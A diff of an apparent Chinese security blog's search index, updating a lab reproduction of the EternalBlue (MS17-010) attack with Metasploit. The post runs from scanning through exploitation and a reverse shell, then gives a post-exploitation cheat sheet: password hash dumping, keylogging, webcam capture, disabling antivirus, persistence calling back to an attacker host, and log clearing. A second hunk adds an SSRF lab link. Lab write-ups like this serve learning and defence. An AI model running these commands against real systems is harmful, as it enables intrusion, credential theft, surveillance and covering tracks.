@@ -663,43 +663,51 @@
   <entry>
     <title>永恒之蓝漏洞复现</title>
     <url>/2022/04/21/eternalblue/</url>
-    <content><![CDATA[<h1 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h1><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<h1 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h1><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h1><p>攻击机：Linux Kali （192.168.8.242）</p>
+    <content><![CDATA[<h1>漏洞描述：</h1>
+<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h1>影响版本：</h1>
+<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1>复现环境：</h1>
+<p>攻击机：Linux Kali （192.168.8.242）</p>
 <p>靶机：Windows7 x64 （192.168.8.172）</p>
-<h1 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
-<p><img src="https://img.anineg.space/1.png" alt="1"></p>
+<h1>复现过程：</h1>
+<h2 id="主机发现">主机发现</h2>
+<p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
 <p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
-<h2 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h2><p>执行<code>msfconsole</code></p>
+<h2 id="进入MSF框架">进入MSF框架</h2>
+<p>执行<code>msfconsole</code></p>
 <p><img src="https://img.anineg.space/2.png" alt="2"></p>
 <p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
 <p><img src="https://img.anineg.space/3.png" alt="3"></p>
 <p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
-<h2 id="使用ms17-010扫描模块"><a href="#使用ms17-010扫描模块" class="headerlink" title="使用ms17-010扫描模块"></a>使用ms17-010扫描模块</h2><p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p>查看模块需要配置的参数  <code>show options</code></p>
+<h2 id="使用ms17-010扫描模块">使用ms17-010扫描模块</h2>
+<p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p>查看模块需要配置的参数  <code>show options  </code></p>
 <p><img src="https://img.anineg.space/4.png" alt="4"></p>
 <p>在Required一栏中显示yes的需要填写Current Setting项</p>
 <p>如 <code>set rhosts 192.168.8.172</code></p>
 <p>执行扫描 <code>run</code></p>
 <p><img src="https://img.anineg.space/5.png" alt="5"></p>
 <p>显示可能存有永恒之蓝漏洞。</p>
-<h2 id="使用ms17-010攻击模块"><a href="#使用ms17-010攻击模块" class="headerlink" title="使用ms17-010攻击模块"></a>使用ms17-010攻击模块</h2><p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>查看模块需要配置的参数  <code>show options</code></p>
+<h2 id="使用ms17-010攻击模块">使用ms17-010攻击模块</h2>
+<p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p>查看模块需要配置的参数  <code>show options  </code></p>
 <p><img src="https://img.anineg.space/6.png" alt="6"></p>
 <p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
 <p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
 <p>执行攻击 <code>run</code></p>
 <p><img src="https://img.anineg.space/7.png" alt="7"></p>
 <center>攻击成功！</center>
-
 <hr>
-<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
+<h2 id="后渗透阶段">后渗透阶段</h2>
+<p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
 <p><img src="https://img.anineg.space/8.png" alt="8"></p>
 <p>使用<code>screenshot</code>进行截屏</p>
 <p><img src="https://img.anineg.space/9.png" alt="9"></p>
 <p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
 <p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
-<h2 id="更多操作"><a href="#更多操作" class="headerlink" title="更多操作"></a>更多操作</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="更多操作">更多操作</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
 ]]></content>
       <categories>
@@ -3488,7 +3496,7 @@
 <h2 id="一、基础概念">一、基础概念</h2>
 <p>Server-side request forgery (SSRF)，服务端请求伪造，简单来说，就是你可以访问A站点，A站点可以访问内网的B站点，你不可以直接访问B站点，但是由于A站点的防护措施或者校验不足，你可以通过控制请求，访问到B站点上的资源，然后A站点将内部网络返回的结果传递给你，你就完成了对内网的攻击。SSRF可能可以实现扫描内网，向内部任意主机的任意端口发送构造的攻击请求，攻击内网WEB应用，读取文件等等。</p>
 <h2 id="二、题目">二、题目</h2>
-<p><strong>题目链接：</strong></p>
+<p>**题目链接：**<a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost</a></p>
 <p><strong>APPRENTICE</strong></p>
 <p>This lab has a stock check feature which fetches data from an internal system.</p>
 <p>这个实验室有一个库存检查功能，可以从内部系统获取数据。</p>
